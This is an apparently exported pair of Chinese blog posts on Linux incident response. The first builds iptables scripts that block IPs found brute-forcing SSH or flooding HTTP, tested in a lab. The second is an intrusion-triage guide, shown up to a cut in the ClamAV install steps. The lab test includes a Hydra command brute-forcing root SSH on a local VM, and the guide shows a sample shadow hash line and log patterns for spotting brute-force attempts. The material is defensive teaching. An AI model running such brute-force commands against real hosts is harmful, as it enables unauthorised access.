[{"title":"两个应急响应脚本分析","url":"/2025/08/03/两个应急响应脚本分析/","content":"\n\n\n### 自动封禁多次尝试暴力破解 SSH 密码的 IP 地址\n\n<!--more-->\n\n```bash\n#!/bin/bash\nIP=$(awk '/Failed password/ {IP[$(NF-3)]++} END { for (k in IP) { if (IP[k]>=4) print k }}' /var/log/secure)\nfor i in $IP\ndo\n  tmpIP=(`iptables -L -n | tr -s \" \" | awk '/^DROP/ && /22$/ {print $4}'`)\n    \n  echo ${tmpIP[@]} | grep -qw $i\n  \n  if [ $? -ne 0 ]\n  then\n    iptables -I INPUT -p tcp --dport 22 -s $i -j DROP \n  fi\ndone\nrpm -q iptables-services &> /dev/null\nif [ $? -ne 0 ]\nthen\n   yum -y install iptables-services &>/dev/null\n   systemctl enable --now iptables.service &> /dev/null\nfi\niptables-save > /etc/sysconfig/iptables\nunset tmpIP\n```\n\n分析\n\n1. 首先从`/var/log/secure`日志文件中提取失败的 SSH 登录尝试：\n   - 使用`awk`命令统计所有出现 \"Failed password\" 记录的 IP 地址\n   - $(NF-3) 指的是  NF 是最后一列，-3 就是倒数第三列\n   - 只筛选出尝试次数不少于 4 次的 IP 地址\n2. 对于这些可疑 IP 地址：\n   - 检查它们是否已经被 iptables 封禁\n   - 如果尚未封禁，则添加 iptables 规则禁止该 IP 访问 22 端口 (SSH)\n3. 确保系统安装了 iptables-services：\n   - 如果未安装，则通过 yum 自动安装\n   - 设置 iptables 服务开机启动并立即启动\n4. 保存 iptables 规则到`/etc/sysconfig/iptables`，确保重启后规则仍然有效\n5. 清理临时变量\n\n\n\n这里是CentOS的环境，我们改为ubantu的环境\n\n```bash\n#!/bin/bash\n\n\nIP=$(awk '/Failed password/ {IP[$(NF-3)]++} END { for (k in IP) { if (IP[k]>=10) print k }}' /var/log/auth.log)\n\nfor i in $IP\ndo\n\n  tmpIP=(`iptables -L -n | tr -s \" \" | awk '/^DROP/ && /22$/ {print $4}'`)\n    \n  echo ${tmpIP[@]} | grep -qw $i\n  \n  if [ $? -ne 0 ]\n  then\n\n    iptables -I INPUT -p tcp --dport 22 -s $i -j DROP \n    echo \"已屏蔽IP: $i\"\n  fi\ndone\n\n# 检查iptables-persistent是否安装（Ubuntu中用于保存规则）\ndpkg -s iptables-persistent &> /dev/null\nif [ $? -ne 0 ]\nthen\n   apt-get update &>/dev/null\n   apt-get -y install iptables-persistent &>/dev/null\nfi\n\nnetfilter-persistent save &>/dev/null\nnetfilter-persistent reload &>/dev/null\n\nunset tmpIP\n\n```\n\n这里 4次 太少了，一般爆破至少都是1000-10000 +\n\n由于测试，我们设置为10试试效果\n\n\n\n我们先用攻击机ping一下 靶机\n\n![image-20250803204525325](两个应急响应脚本分析/image-20250803204525325.png)\n\n网络通畅\n\n\n\n接下来我们用kali自带的Hydra(九头蛇) 进行爆破\n\n```bash\nhydra -l root -P /top100_ssh_vps.txt 192.168.197.133 ssh\n```\n\n![image-20250803205013657](两个应急响应脚本分析/image-20250803205013657.png)\n\n我用用-Vv这个参数看看爆破过程\n\n![image-20250803205204546](两个应急响应脚本分析/image-20250803205204546.png)\n\n看来我们的密码还是挺强的\n\n哈哈哈\n\n\n\n然后我们去 靶机查看一下日志\n\n![image-20250803205311180](两个应急响应脚本分析/image-20250803205311180.png)\n\n这里也是能够看见我们刚刚的尝试，这个脚本也是利用了这个日志实现的\n\n然后我们运行一下脚本\n\n![image-20250803205459167](两个应急响应脚本分析/image-20250803205459167.png)\n\n给他可执行权限\n\n```\nchmod +x deny_ssh.sh\n```\n\n运行![image-20250803205629674](两个应急响应脚本分析/image-20250803205629674.png)\n\n可以看到成功，但是不小心把我物理机的ip也屏蔽了\n\n哈哈哈哈\n\n我们放行 一下物理机\n\n```bash\niptables -L INPUT --line-numbers | grep DROP\n```\n\n查看一下被drop的ip\n\n![image-20250803205959336](两个应急响应脚本分析/image-20250803205959336.png)\n\n```\n# 假设规则序号是1（从上面命令获取）\niptables -D INPUT 1\n\n# 或者直接通过IP地址删除\niptables -D INPUT -s 192.168.197.1 -p tcp --dport 22 -j DROP\n```\n\n两种方法都可以\n\n![image-20250803210209315](两个应急响应脚本分析/image-20250803210209315.png)\n\n\n\n\n\n我们优化一下脚本\n\n```bash\n#!/bin/bash\n\n# 配置变量\nLOG_FILE=\"/var/log/auth.log\"\nBLOCKED_IPS_DIR=\"/var/log/blocked_ips\"\nBLOCK_THRESHOLD=4  # 触发封锁的失败次数\nUNBAN_HOURS=24     # 解封时间（小时）\n\n# 确保存储封锁记录的目录存在\nmkdir -p \"$BLOCKED_IPS_DIR\"\n\n# 1. 检查并解封超过指定时间的IP\necho \"检查需要解封的IP...\"\nfor blocked_ip in \"$BLOCKED_IPS_DIR\"/*; do\n    # 提取IP地址\n    ip=$(basename \"$blocked_ip\")\n    \n    # 检查文件是否存在且是常规文件\n    if [ -f \"$blocked_ip\" ]; then\n        # 获取封锁时间（文件创建时间）\n        block_time=$(stat -c %Y \"$blocked_ip\")\n        current_time=$(date +%s)\n        time_diff=$(( (current_time - block_time) / 3600 ))  # 转换为小时\n        \n        # 检查是否超过解封时间\n        if [ $time_diff -ge $UNBAN_HOURS ]; then\n            # 从iptables中删除规则\n            iptables -D INPUT -p tcp --dport 22 -s \"$ip\" -j DROP 2>/dev/null\n            \n            # 删除记录文件\n            rm -f \"$blocked_ip\"\n            \n            echo \"已自动解封IP: $ip（超过$UNBAN_HOURS小时无活动）\"\n        fi\n    fi\ndone\n\n# 2. 检测并封锁新的恶意IP\necho \"检测新的恶意IP...\"\n# 从日志中提取失败次数达到阈值的IP\nIP=$(awk '/Failed password/ {IP[$(NF-3)]++} END { for (k in IP) { if (IP[k]>='$BLOCK_THRESHOLD') print k }}' \"$LOG_FILE\")\n\nfor ip in $IP; do\n    # 检查IP是否已在DROP规则中\n    if ! iptables -L INPUT -n | grep -q \"DROP.*tcp dpt:22.*$ip\"; then\n        # 添加封锁规则\n        iptables -I INPUT -p tcp --dport 22 -s \"$ip\" -j DROP\n        # 创建/更新封锁记录文件（文件修改时间将用于判断解封）\n        touch \"$BLOCKED_IPS_DIR/$ip\"\n        echo \"已封锁IP: $ip（失败次数超过$BLOCK_THRESHOLD次）\"\n    else\n        # 如果IP已被封锁，更新记录文件时间（表示该IP仍在尝试）\n        touch \"$BLOCKED_IPS_DIR/$ip\"\n    fi\ndone\n\n# 3. 确保iptables-persistent已安装\nif ! dpkg -s iptables-persistent &> /dev/null; then\n    echo \"安装iptables-persistent...\"\n    apt-get update &>/dev/null\n    apt-get -y install iptables-persistent &>/dev/null\nfi\n\n# 4. 保存规则\nnetfilter-persistent save &>/dev/null\nnetfilter-persistent reload &>/dev/null\n\necho \"操作完成\"\n\n```\n\n1. **添加自动解封功能**：\n   - 创建了`/var/log/blocked_ips`目录存储被封锁 IP 的记录\n   - 每个被封锁的 IP 会创建一个对应的文件，文件的修改时间用于跟踪最后一次尝试\n   - 脚本运行时会检查所有封锁记录，超过 24 小时未活动的 IP 会被自动解封\n2. **提高效率**：\n   - 使用`iptables -L ... | grep`直接检查 IP 是否已被封锁，替代了原来的数组方法\n   - 对于已封锁但仍在尝试的 IP，会更新其记录文件时间，延长封锁期\n3. **增加可读性**：\n   - 添加了清晰的注释和状态提示\n   - 使用变量集中管理配置参数，便于后续调整\n\n\n\n\n\n然后我们设置计划任务，每分钟运行一次\n\n`chmod +x betterssh.sh`\n\n` crontab -e`\n\n`* * * * * /root/betterssh.sh >> /var/log/ssh_ban.log 2>&1`\n\n![image-20250803220545281](两个应急响应脚本分析/image-20250803220545281.png)\n\n这样他就会一分钟运行一次了\n\n![image-20250803220625303](两个应急响应脚本分析/image-20250803220625303.png)\n\n运行正常\n\n又把我们的ip拉黑了，设置一下白名单\n\n```bash\n#!/bin/bash\n\n# 配置变量\nLOG_FILE=\"/var/log/auth.log\"\nBLOCKED_IPS_DIR=\"/var/log/blocked_ips\"\nBLOCK_THRESHOLD=4  # 触发封锁的失败次数\nUNBAN_HOURS=24     # 解封时间（小时）\n\n# 白名单IP列表 - 添加你想要豁免的IP，用空格分隔\nWHITELIST_IPS=\"192.168.197.1\"\n\n# 确保存储封锁记录的目录存在\nmkdir -p \"$BLOCKED_IPS_DIR\"\n\n# 1. 检查并解封超过指定时间的IP\necho \"检查需要解封的IP...\"\nfor blocked_ip in \"$BLOCKED_IPS_DIR\"/*; do\n    ip=$(basename \"$blocked_ip\")\n    \n    if [ -f \"$blocked_ip\" ]; then\n        block_time=$(stat -c %Y \"$blocked_ip\")\n        current_time=$(date +%s)\n        time_diff=$(( (current_time - block_time) / 3600 ))\n        \n        if [ $time_diff -ge $UNBAN_HOURS ]; then\n            iptables -D INPUT -p tcp --dport 22 -s \"$ip\" -j DROP 2>/dev/null\n            rm -f \"$blocked_ip\"\n            echo \"已自动解封IP: $ip（超过$UNBAN_HOURS小时无活动）\"\n        fi\n    fi\ndone\n\n# 2. 检测并封锁新的恶意IP\necho \"检测新的恶意IP...\"\nIP=$(awk '/Failed password/ {IP[$(NF-3)]++} END { for (k in IP) { if (IP[k]>='$BLOCK_THRESHOLD') print k }}' \"$LOG_FILE\")\n\nfor ip in $IP; do\n    # 检查IP是否在白名单中\n    if echo \"$WHITELIST_IPS\" | grep -qw \"$ip\"; then\n        echo \"IP $ip 在白名单中，跳过封锁\"\n        continue  # 跳过白名单IP，不执行后续封锁操作\n    fi\n\n    # 检查IP是否已在DROP规则中\n    if ! iptables -L INPUT -n | grep -q \"DROP.*tcp dpt:22.*$ip\"; then\n        iptables -I INPUT -p tcp --dport 22 -s \"$ip\" -j DROP\n        touch \"$BLOCKED_IPS_DIR/$ip\"\n        echo \"已封锁IP: $ip（失败次数超过$BLOCK_THRESHOLD次）\"\n    else\n        touch \"$BLOCKED_IPS_DIR/$ip\"\n    fi\ndone\n\n# 3. 确保iptables-persistent已安装\nif ! dpkg -s iptables-persistent &> /dev/null; then\n    echo \"安装iptables-persistent...\"\n    apt-get update &>/dev/null\n    apt-get -y install iptables-persistent &>/dev/null\nfi\n\n# 4. 保存规则\nnetfilter-persistent save &>/dev/null\nnetfilter-persistent reload &>/dev/null\n\necho \"操作完成\"\n\n```\n\n最终版\n\n![image-20250803221212403](两个应急响应脚本分析/image-20250803221212403.png)\n\n\n\n\n\n### web中间件风控脚本\n\n```bash\n#!/bin/bash\n# 日志文件路径\nlogfile=/var/log/httpd/\nlast_minutes=1 \n# 开始时间1分钟之前（这里可以修改,如果要几分钟之内攻击次数多少次，这里可以自定义）\nstart_time=`date -d\"$last_minutes minutes ago\" +\"%d/%m/%Y:%H:%M:%S\"`\necho $start_time\n# 结束时间现在\nstop_time=`date +\"%d/%m/%Y:%H:%M:%S\"`\necho $stop_time\ncur_date=\"`date +%d/%m/%Y`\"\necho $cur_date\n# 过滤出单位之间内的日志并统计最高ip数，请替换为你的日志路径\ntac $logfile/access.log | awk -v st=\"$start_time\" -v et=\"$stop_time\" '{t=substr($4,2);if(t>=st && t<=et){print $1}}' |sort | uniq -c | sort -nr > $logfile/log_ip_top10\n#ip_top=`cat $logfile/log_ip_top10 | head -1 | awk '{print $1}'`\n# 出现横杠使用sed去掉第一行\n#sed -i '1d' $logfile/log_ip_top10    \n# 单位时间[1分钟]内单ip访问次数超过200次的ip记录入black.txt\nip=`cat $logfile/log_ip_top10 | awk '{if($1 > 100)print $2}'`\nfor line in $ip\ndo\necho $line >> $logfile/getip.txt\necho $line\niptables -I INPUT -p tcp  -m multiport --dport 80,443 -s $line -j DROP\ndone\n```\n\n分析\n\n先定义了log的位置\n\n和监控时间\n\n```bash\nstart_time=`date -d\"$last_minutes minutes ago\" +\"%d/%m/%Y:%H:%M:%S\"`  # 起始时间（1分钟前）\nstop_time=`date +\"%d/%m/%Y:%H:%M:%S\"`                                # 结束时间（当前时间）\n```\n\n日志过滤与 IP 统计\n\n```bash\ntac $logfile/access.log | awk -v st=\"$start_time\" -v et=\"$stop_time\" '{\n  t=substr($4,2);  # 提取日志中的时间字段（HTTP日志第4列格式通常为 \"[01/Jan/2024:12:34:56\"，substr去掉开头的\"[\"）\n  if(t>=st && t<=et){print $1}  # 筛选时间范围内的日志，输出访问的IP地址（第1列）\n}' | sort | uniq -c | sort -nr > $logfile/log_ip_top10\n```\n\n作用：\n\n- `tac`：反向读取日志（从最新记录开始）\n- `awk`：按时间范围筛选日志，提取符合条件的 IP\n- `sort | uniq -c`：统计每个 IP 的访问次数\n- `sort -nr`：按访问次数从高到低排序 \n- 结果保存到 `log_ip_top10` 文件（前 10 名高频访问 IP）\n- 这里也可以将前面的sort删除掉\n\n筛选需封禁的 IP\n\n```bash\nip=`cat $logfile/log_ip_top10 | awk '{if($1 > 100)print $2}'`  # 提取访问次数超过100次的IP\n```\n\n作用：设定阈值设为 100 次，超过此次数的 IP 被判定为 \"异常访问\"。\n\n封禁 IP\n\n```bash\nfor line in $ip\ndo\n  echo $line >> $logfile/getip.txt  # 将封禁的IP记录到文件\n  iptables -I INPUT -p tcp -m multiport --dport 80,443 -s $line -j DROP  # 封禁IP的80（HTTP）和443（HTTPS）端口访问\ndone\n```\n\n作用：通过 iptables 规则禁止异常 IP 访问服务器的 HTTP/HTTPS 端口。\n\n\n\n这个脚本也没有解封的机制，我们优化一下，在设置一个白名单，直接丢ai\n\n\n\n\n\n```bash\n#!/bin/bash\n\n# 配置变量\nlogfile=\"/var/log/httpd\"                  # 日志文件目录\naccess_log=\"$logfile/access.log\"          # 访问日志路径\nblocked_ips_dir=\"/var/log/blocked_ips\"    # 存储被封锁IP记录的目录\nlast_minutes=1                            # 监控时间窗口（分钟）\nthreshold=100                             # 触发封锁的访问次数阈值\nunban_hours=2                             # 自动解封时间（小时）\n\n# 白名单IP列表 - 添加信任的IP，用空格分隔\nwhitelist_ips=\"192.168.197.1\"\n\n# 确保必要目录存在\nmkdir -p \"$blocked_ips_dir\"\n\n# 1. 自动解封超过指定时间的IP\necho \"检查需要解封的IP...\"\nfor blocked_ip in \"$blocked_ips_dir\"/*; do\n    # 提取IP地址\n    ip=$(basename \"$blocked_ip\")\n    \n    # 检查文件是否存在\n    if [ -f \"$blocked_ip\" ]; then\n        # 获取封锁时间和当前时间（秒级）\n        block_time=$(stat -c %Y \"$blocked_ip\")\n        current_time=$(date +%s)\n        time_diff=$(( (current_time - block_time) / 3600 ))  # 转换为小时\n        \n        # 超过解封时间则解除封锁\n        if [ $time_diff -ge $unban_hours ]; then\n            # 从iptables中删除规则\n            iptables -D INPUT -p tcp -m multiport --dport 80,443 -s \"$ip\" -j DROP 2>/dev/null\n            \n            # 删除记录文件\n            rm -f \"$blocked_ip\"\n            \n            echo \"已自动解封IP: $ip（超过$unban_hours小时无异常活动）\"\n        fi\n    fi\ndone\n\n# 2. 计算时间范围\nstart_time=$(date -d\"$last_minutes minutes ago\" +\"%d/%m/%Y:%H:%M:%S\")\nstop_time=$(date +\"%d/%m/%Y:%H:%M:%S\")\necho \"监控时间范围: $start_time 至 $stop_time\"\n\n# 3. 过滤日志并统计IP访问次数\nif [ -f \"$access_log\" ]; then\n    # 筛选时间范围内的IP并统计\n    tac \"$access_log\" | awk -v st=\"$start_time\" -v et=\"$stop_time\" '{\n        t=substr($4,2);  # 提取时间字段（去掉开头的\"[\"）\n        if(t>=st && t<=et){print $1}  # 输出符合时间范围的IP\n    }' | sort | uniq -c | sort -nr > \"$logfile/log_ip_top10\"\nelse\n    echo \"错误: 日志文件 $access_log 不存在\"\n    exit 1\nfi\n\n# 4. 处理需要封锁的IP\nip_list=$(cat \"$logfile/log_ip_top10\" | awk -v threshold=\"$threshold\" '{if($1 > threshold)print $2}')\n\nfor ip in $ip_list; do\n    # 检查是否为白名单IP\n    if echo \"$whitelist_ips\" | grep -qw \"$ip\"; then\n        echo \"IP $ip 在白名单中，跳过封锁\"\n        continue\n    fi\n    \n    # 检查IP是否已被封锁\n    if [ -f \"$blocked_ips_dir/$ip\" ]; then\n        # 已封锁，更新记录时间（延长封锁）\n        touch \"$blocked_ips_dir/$ip\"\n        echo \"IP $ip 仍在高频访问，延长封锁时间\"\n    else\n        # 未封锁，添加iptables规则\n        iptables -I INPUT -p tcp -m multiport --dport 80,443 -s \"$ip\" -j DROP\n        # 创建封锁记录文件\n        touch \"$blocked_ips_dir/$ip\"\n        echo \"已封锁IP: $ip（$last_minutes分钟内访问超过$threshold次）\"\n        # 记录到日志\n        echo \"$(date +\"%Y-%m-%d %H:%M:%S\") - 封锁IP: $ip\" >> \"$logfile/blocked_log.txt\"\n    fi\ndone\n\necho \"操作完成\"\n\n```\n\n一样加入计划任务就行了\n\n`logfile`   `access_log`需要根据我们中间件的位置进行更换\n\n\n\n","tags":["应急响应"],"categories":["web安全"]},{"title":"应急响应-Linux篇","url":"/2025/08/03/应急响应-Linux篇/","content":"\n\n\n### Linux 入侵排查\n\n<!--more-->\n\n#### 0x00 前言\n\n当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  \n\n针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。\n\n#### 0x01 入侵排查思路\n\n##### 1.1 账号安全\n\n**基本使用：**\n\n~~~\n1、用户信息文件 /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\naccount:password:UID:GID:GECOS:directory:shell\n用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell\n注意：无密码只允许本机登陆，远程不允许登陆\n\n2、影子文件 /etc/shadow\nroot:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::\n用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留\n\n这里重点看有密码的也就是后面又hash值的，没有密码不能进行远程连接\n~~~\n\n~~~\nwho     查看当前登录用户（tty 本地登陆  pts 远程登录）\nw       查看系统信息，想知道某一时刻用户的行为\nuptime  查看登陆多久、多少用户，负载状态\n~~~\n\n**入侵排查：**\n\n~~~\n1、查询特权用户特权用户(uid 为0)\n[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd\n2、查询可以远程登录的帐号信息\n[root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow\n这条awk命令的作用是从/etc/shadow文件中筛选出使用$1$（MD5 加密）或$6$（SHA-512 加密）算法存储密码的用户，并打印这些用户的用户名，也就是有hash密码的\nroot@ubuntu:~# awk -F: '/\\$1|\\$6/{print $1}' /etc/shadow      #只会打印账号\n3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限\n[root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\"\n  先用more 读取 /etc/sudoers 然后通过第一个管道符 grep -v 进行反向匹配，也就是不包含 #开头 和空行，然   后在通过管道符 匹配权限ALL=(ALL)\n4、禁用或删除多余及可疑的帐号\n    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头\n\tuserdel user       删除 user 用户\n\tuserdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除\n~~~\n\n##### 1.2 历史命令\n\n**基本使用：**\n\n通过 .bash_history 文件查看帐号执行过的系统命令\n\n~~~\n1、root 用户的历史命令\nhistroy\n2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。\n为历史的命令增加登录的 IP 地址、执行命令时间等信息：\n1）保存1万条命令\nsed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile\n有些系统 不会在这个地方，可以用grep -r HISTSIZE /etc 进行查看\n\nroot@ubuntu:~# grep -r HISTSIZE /etc\n/etc/skel/.bashrc:# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)\n/etc/skel/.bashrc:HISTSIZE=1000\n\n然后对应的进行修改文件\n\n2）在/etc/profile的文件尾部添加如下行数配置信息：\n######jiagu history xianshi#########\nUSER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`\nif [ \"$USER_IP\" = \"\" ]\nthen\nUSER_IP=`hostname`\nfi\nexport HISTTIMEFORMAT=\"%F %T $USER_IP `whoami` \"\nshopt -s histappend\nexport PROMPT_COMMAND=\"history -a\"\n######### jiagu history xianshi ##########\n3）source /etc/profile 让配置生效\n生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile\n3、历史操作命令的清除：history -c\n但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。\n~~~\n\n**入侵排查：**\n\n~~~\n进入用户目录下，导出历史命令。\ncat .bash_history >> history.txt\n~~~\n\n##### 1.3 检查异常端口\n\n使用 netstat 网络连接命令，分析可疑端口、IP、PID\n\n~~~\nnetstat -antlp | more    需要安装这个命令  apt install net-tools\n\n查看下 pid 所对应的进程文件路径，\n运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）\n~~~\n\n##### 1.4 检查异常进程\n\n使用 ps 命令，分析进程\n\n~~~\nps aux | grep pid \n~~~\n\n##### 1.5 检查开机启动项\n\n**基本使用：**\n\n系统运行级别示意图：\n\n| 运行级别 |                           含义                            |\n| :------: | :-------------------------------------------------------: |\n|    0     |                           关机                            |\n|    1     | 单用户模式，可以想象为windows的安全模式，主要用于系统修复 |\n|    2     |              不完全的命令行模式，不含NFS服务              |\n|    3     |            完全的命令行模式，就是标准字符界面             |\n|    4     |                         系统保留                          |\n|    5     |                         图形模式                          |\n|    6     |                          重启动                           |\n\n查看运行级别命令 `runlevel`\n\n系统默认允许级别\n\n\tvi  /etc/inittab\n\tid=3：initdefault  #系统开机后直接进入哪个运行级别\n\n开机启动配置文件\n\n\t/etc/rc.local\n\t/etc/rc.d/rc[0~6].d\n\n例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。\n\n注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级\n\n\troot@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh\n\n此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。\n\n**入侵排查：**\n\n启动项文件：\n\n```\nmore /etc/rc.local\n/etc/rc.d/rc[0~6].d\nls -l /etc/rc.d/rc3.d/\n```\n\n##### 1.6 检查定时任务\n\n**基本使用**\n\n1、利用 crontab 创建计划任务\n\n* 基本命令\n\n  ```\n  crontab -l   列出某个用户cron服务的详细内容\n  \n  Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root\n  \n  crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)\n  \n  crontab -e   使用编辑器编辑当前的crontab文件 \n  \n  如：*/1 * * * * echo \"hello world\" >> /tmp/test.txt 每分钟写入文件\n  ```\n\n2、利用 anacron 命令实现异步定时任务调度\n\n* 使用案例\n\n  ```\n  每天运行 /home/backup.sh 脚本：\n  vi /etc/anacrontab \n  @daily    10    example.daily   /bin/bash /home/backup.sh\n  当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。\n  ```\n\n**入侵排查**\n\n重点关注以下目录中是否存在恶意脚本\n\n\t/var/spool/cron/* \n\t/etc/crontab\n\t/etc/cron.d/*\n\t/etc/cron.daily/* \n\t/etc/cron.hourly/* \n\t/etc/cron.monthly/*\n\t/etc/cron.weekly/\n\t/etc/anacrontab\n\t/var/spool/anacron/*\n\n小技巧：\n\n\tmore /etc/cron.daily/*  查看目录下所有文件\n\n##### 1.7 检查服务\n\n**服务自启动**\n\n第一种修改方法：\n\n\tchkconfig [--level 运行级别] [独立服务名] [on|off]\n\tchkconfig –level  2345 httpd on  开启自启动\n\tchkconfig httpd on （默认level是2345）\n\n第二种修改方法：\n\n\t修改 /etc/re.d/rc.local 文件  \n\t加入 /etc/init.d/httpd start\n\n第三种修改方法：\n\n使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。\n\n**入侵排查**\n\n1、查询已安装的服务：\n\nRPM 包安装的服务\n\n\tchkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务\n\tps aux | grep crond 查看当前服务\n\t\n\t系统在3与5级别下的启动项 \n\t中文环境\n\tchkconfig --list | grep \"3:启用\\|5:启用\"\n\t英文环境\n\tchkconfig --list | grep \"3:on\\|5:on\"\n\n\n源码包安装的服务\n\n\t查看服务安装位置 ，一般是在/user/local/\n\tservice httpd start\n\t搜索/etc/rc.d/init.d/  查看是否存在\n\n##### 1.8 检查异常文件\n\n1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性\n\n2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？\n\n​\t可以使用find命令来查找，如  find /opt -iname \"*\" -atime 1 -type f 找出 /opt 下一天前访问过的文件\n\n3、针对可疑文件可以使用 stat 进行创建修改时间。\n\n##### 1.9 检查系统日志\n\n日志默认存放位置：/var/log/\n\n查看日志配置情况：more /etc/rsyslog.conf\n\n|     日志文件     |                             说明                             |\n| :--------------: | :----------------------------------------------------------: |\n|  /var/log/cron   |                 记录了系统定时任务相关的日志                 |\n|  /var/log/cups   |                      记录打印信息的日志                      |\n|  /var/log/dmesg  | 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 |\n| /var/log/mailog  |                         记录邮件信息                         |\n| /var/log/message | 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 |\n|  /var/log/btmp   | 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 |\n| /var/log/lastlog | 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 |\n|  /var/log/wtmp   | 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 |\n|  /var/log/utmp   | 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 |\n| /var/log/secure  | 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 |\n\n日志分析技巧：\n\n~~~\n1、定位有多少IP在爆破主机的root帐号：    \ngrep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more\n\n定位有哪些IP在爆破：\ngrep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c\n\n爆破用户名字典是什么？\ngrep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr\n \n2、登录成功的IP有哪些： \t\ngrep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more\n\n登录成功的日期、用户名、IP：\ngrep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' \n\n3、增加一个用户kali日志：\nJul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001\nJul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali\n, shell=/bin/bash\nJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali\n#grep \"useradd\" /var/log/secure \n\n4、删除用户kali日志：\nJul 10 00:14:17 localhost userdel[2393]: delete user 'kali'\nJul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'\nJul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'\n# grep \"userdel\" /var/log/secure\n\n5、su切换用户：\nJul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)\n\nsudo授权执行:\nsudo -l\nJul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now\n~~~\n\n#### 0x02 工具篇\n\n##### 2.1 Rootkit查杀\n\n* chkrootkit  \n\n  网址：http://www.chkrootkit.org \n\n  ~~~\n  使用方法：\n  wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz\n  tar zxvf chkrootkit.tar.gz\n  cd chkrootkit-0.52\n  make sense\n  #编译完成没有报错的话执行检查\n  ./chkrootkit\n  ~~~\n\n* rkhunter\n\n  网址：http://rkhunter.sourceforge.net\n\n  ~~~\n  使用方法：\n  Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz\n  tar -zxvf rkhunter-1.4.4.tar.gz\n  cd rkhunter-1.4.4\n  ./installer.sh --install\n  rkhunter -c\n  ~~~\n\n##### 2.2 病毒查杀\n\n* Clamav\n\n  网址：<http://www.clamav.net/download.html> \n\n  安装方式一： \n\n  ~~~\n  1、安装 zlib：\n  wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz \n  tar -zxvf  zlib-1.2.7.tar.gz\n  cd 